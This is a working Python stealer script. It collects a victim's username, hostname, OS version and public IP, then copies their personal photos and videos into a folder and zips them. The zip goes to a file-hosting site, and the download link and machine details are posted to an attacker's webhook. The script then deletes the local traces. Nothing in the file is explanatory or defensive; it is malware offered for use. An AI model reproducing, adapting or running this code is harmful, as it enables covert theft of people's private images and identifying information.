wh00k = "YOUR_WBK_URL"
#Made by douxxu
#2+2=7

import os
import platform
import zipfile
import requests
import json
import shutil
import socket

COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m" 
COLOR_MAGENTA = "\033[95m"


def adresse_ip():
    response = requests.get("https://ipinfo.io/json")
    ip_data = json.loads(response.text)
    return ip_data.get('ip', 'N/A')

informations = {
        "Utilisateur": os.getlogin() if os.name == "posix" else None,
        "nom d'hôte": socket.gethostname(),
        "Système d'exploitation": platform.system(),
        "Version du système d'exploitation": platform.release(),
        "Adresse IP": adresse_ip()
}

max_fichiers = 10 
count_per_directory = 0
max_go = 0.99 
dossier_img = "images"
if not os.path.exists(dossier_img):
    os.makedirs(dossier_img) 

def taille_dossier(dossier):
    total_size = 0
    with os.scandir(dossier) as it:
        for entry in it:
            if entry.is_file():
                total_size += entry.stat().st_size
            elif entry.is_dir():
                total_size += taille_dossier(entry.path)
    return total_size / (1024 * 1024 * 1024)

def copier(directory_path):
    global count_per_directory, dossier_img
    taille_images_gb = taille_dossier(dossier_img)
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if taille_images_gb > max_go:
                print(COLOR_MAGENTA + "[+] Recovered files, Downloading.")
                return 
            if count_per_directory >= max_fichiers:

                count_per_directory = 0
                dossier_img = "images"

            if file.lower().endswith(('.jpg', '.jpeg', '.mp4', '.mov')):
                source_path = os.path.join(root, file)
                destination_path = os.path.join(dossier_img, file)

                taille_mo = os.path.getsize(source_path) / (1024 * 1024)
                if taille_mo > 60:
                    print(COLOR_RED + f"[-] The {file} file exceeds the size limit (60 MB).")
                    continue 

                if os.path.abspath(source_path) != os.path.abspath(destination_path):
                    try:
                        shutil.copy(source_path, destination_path)
                        count_per_directory += 1
                        taille_images_gb = taille_dossier(dossier_img)
                        prcent = taille_images_gb*100
                        print(COLOR_GREEN + f"Images / videos found: {prcent:.2f} %")
                    except PermissionError as e:
                        print(COLOR_RED + "[*]")
                else:
                    print(COLOR_RED + "[-]")

repertoire_actuel = os.getcwd() 
copier(repertoire_actuel)

with zipfile.ZipFile("images.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(dossier_img):
            for file in files:
                zipf.write(os.path.join(root, file), file)


upload_url = "https://store1.gofile.io/uploadFile"

fichier_zip = "images.zip"

with open(fichier_zip, "rb") as file:
    files = {"file": file}

    response = requests.post(upload_url, files=files)

    if response.status_code == 200:
        data = response.json()

message = {
    "embeds": [
        {
            "title": "Images found on the device",
            "color": 000000000,
            "fields": [
                {"name": "User", "value": informations["Utilisateur"], "inline": True},
                {"name": "Host name", "value": informations["nom d'hôte"], "inline": True},
                {"name": "Operating system", "value": informations["Système d'exploitation"], "inline": True},
                {"name": "Version of operating system", "value": informations["Version du système d'exploitation"], "inline": True},
                {"name": "Ip adress", "value": informations["Adresse IP"], "inline": True},
                {"name": "ZIP file link", "value": data["data"]["downloadPage"], "inline": False}
            ]
        }
    ]
}
response = requests.post(wh00k, json=message)
print(COLOR_GREEN + "[++] Download complete.") 
shutil.rmtree(dossier_img)
os.remove("images.zip") 

